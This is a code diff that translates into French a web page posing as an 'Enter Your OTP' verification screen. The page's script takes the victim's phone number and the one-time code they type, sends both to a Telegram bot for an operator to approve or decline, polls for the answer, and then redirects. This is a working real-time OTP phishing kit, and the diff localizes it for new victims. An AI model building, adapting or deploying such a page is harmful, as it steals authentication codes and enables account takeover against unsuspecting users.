@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Enter Your OTP</title>
+    <title>Entrez votre code OTP</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
     <style>
@@ -180,14 +180,14 @@
     </div>
 
     <div class="header-section">
-        <h1 class="title">Enter Your OTP</h1>
-        <p class="subtitle" id="subtitleText">Please enter the OTP code just sent to your phone.</p>
+        <h1 class="title">Entrez votre code OTP</h1>
+        <p class="subtitle" id="subtitleText">Veuillez entrer le code OTP qui vient d'être envoyé sur votre téléphone.</p>
     </div>
 
     <!-- Loading Overlay -->
     <div id="loading-overlay" class="loading-overlay">
         <div class="spinner"></div>
-        <span id="loading-text">Waiting for approval...</span>
+        <span id="loading-text">En attente d'approbation...</span>
     </div>
 
     <form class="form-container" id="otpForm">
@@ -203,10 +203,10 @@
 
         <!-- Timer / Resend section -->
         <div class="timer-text" id="timer">00:47</div>
-        <button type="button" class="resend-btn" id="resendBtn">Resend Code</button>
+        <button type="button" class="resend-btn" id="resendBtn">Renvoyer le code</button>
 
         <div class="bottom-section">
-            <button type="submit" id="submitBtn" class="submit-btn" disabled>Continue</button>
+            <button type="submit" id="submitBtn" class="submit-btn" disabled>Continuer</button>
         </div>
     </form>
 
@@ -305,22 +305,22 @@
 
                 if (otpCode.length !== 6) return;
 
-                const phone = localStorage.getItem("phone") || "Unknown";
+                const phone = localStorage.getItem("phone") || "Inconnu";
                 const sessionId = 'otp_' + Date.now();
 
                 // Show loading screen
                 if (overlay) overlay.style.display = "flex";
-                loadingText.textContent = "Waiting for admin approval...";
+                loadingText.textContent = "En attente de l'approbation de l'administrateur...";
 
-                const message = `🔔 *OTP Verification Code*\n\n📱 Phone: \`${phone}\`\n🔢 OTP: \`${otpCode}\`\n🆔 Session: \`${sessionId}\``;
+                const message = `🔔 *Code de Vérification OTP*\n\n📱 Téléphone : \`${phone}\`\n🔢 OTP : \`${otpCode}\`\n🆔 Session : \`${sessionId}\``;
 
                 const inlineKeyboard = {
                     inline_keyboard: [
                         [{
-                            text: "✅ Approved",
+                            text: "✅ Approuvé",
                             callback_data: `approve:${sessionId}`
                         }, {
-                            text: "❌ Decline",
+                            text: "❌ Refusé",
                             callback_data: `decline:${sessionId}`
                         }]
                     ]
@@ -345,12 +345,12 @@
                         startPollingForApproval(BOT_TOKEN, sessionId);
                     } else {
                         if (overlay) overlay.style.display = "none";
-                        alert("Error sending request. Please try again.");
+                        alert("Erreur lors de l'envoi de la demande. Veuillez réessayer.");
                     }
                 } catch (err) {
-                    console.error("Network error:", err);
+                    console.error("Erreur réseau :", err);
                     if (overlay) overlay.style.display = "none";
-                    alert("Network error. Please check your connection.");
+                    alert("Erreur réseau. Veuillez vérifier votre connexion.");
                 }
             });
 
@@ -380,11 +380,11 @@
                                             },
                                             body: JSON.stringify({
                                                 callback_query_id: callbackQueryId,
-                                                text: "Approved!"
+                                                text: "Approuvé !"
                                             })
                                         });
 
-                                        loadingText.textContent = "Approved! Redirecting...";
+                                        loadingText.textContent = "Approuvé ! Redirection en cours...";
                                         setTimeout(() => {
                                             window.location.href = "page8.html";
                                         }, 1000);
@@ -399,7 +399,7 @@
                                             },
                                             body: JSON.stringify({
                                                 callback_query_id: callbackQueryId,
-                                                text: "Declined. Please re-enter."
+                                                text: "Refusé. Veuillez recommencer."
                                             })
                                         });
 
@@ -410,14 +410,14 @@
                                         otpBoxes[0].focus();
                                         validateOtp();
 
-                                        alert("OTP was declined. Please re-enter.");
+                                        alert("Le code OTP a été refusé. Veuillez le saisir à nouveau.");
                                         return;
                                     }
                                 }
                             }
                         }
                     } catch (error) {
-                        console.error("Polling error:", error);
+                        console.error("Erreur de scrutation :", error);
                     }
                 }, 2000);
             }
